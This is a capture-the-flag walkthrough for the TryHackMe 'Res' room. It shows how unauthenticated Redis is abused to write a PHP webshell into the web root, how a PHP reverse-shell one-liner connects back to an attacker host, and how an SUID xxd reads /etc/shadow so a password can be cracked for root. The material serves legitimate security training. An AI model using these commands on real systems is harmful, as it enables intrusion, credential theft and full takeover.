```bash
# PLATFORM          . THM
# CTF NAME          . Res
# DESCRIPTION       . Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/res
```

```
sudo nmap -sSVC -T5 -p- 10.10.132.240 -oN res
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

6379/tcp open  redis   Redis key-value store 6.0.7
```

**PORT 80**

- Default apache installation page.

**PORT 6379**

- I used `redis-cli` to authenticate to the redis server. 

```
redis-cli -h 10.10.132.240
```

- By default, `redis` doesn't require authentication. However, I tried running the command `AUTH default default` and I got `OK` as an answer, so I assumed I was authenticated.

- After some googling around, I found out that you can use redis to write to files.

- This made me think that, considering we have apache running, we might be able to write a reverse shell and access it via the webserver running on port 80.

- To do this, I had followed the next steps:

```
10.10.132.240:6379> config set dir /var/www/html
OK
10.10.132.240:6379> config set dbfilename shell.php
OK
10.10.132.240:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.132.240:6379> save
```

- It's worth mentioning that this is working purely because `/var/www/html` is writable.

- Next, I've accessed the webshell by going to `http://IP/shell.php?cmd=`

- I used a URL-Encoded PHP reverse shell to connect back to my listener

```
php -r '$sock=fsockopen("IP",3131);exec("sh <&3 >&3 2>&3");'
```

```
http://IP/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22IP%22%2C3131%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

- After stabilising the shell, I started looking for privilege escalation vectors.

```
find / -type f -perm -04000 -ls 2>/dev/null

...
262073     20 -rwsr-xr-x   1 root     root        18552 Mar 18  2020 /usr/bin/xxd
...
```

- We have the SUID bit set for the `xxd` binary. This can be used to read from files that we don't have access to.

```
/usr/bin/xxd "/path/to/file" | xxd -r
```

- The user flag located in `/home/vianka/user.txt` is already readable.
- We can use `xxd` to read the root flag from `/root/root.txt`.

- However, if we read the `/etc/shadow` file and copy the hash of user `vianka`, we can easily crack the password, so we can escalate our privileges.

```
/opt/john/run/john hash 

b{redacted}1       (vianka)
```

- A simple `sudo -l` reveals that we have full access on the system.

```
User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

```
vianka@ubuntu:~$ sudo su

root@ubuntu:/home/vianka# 
```

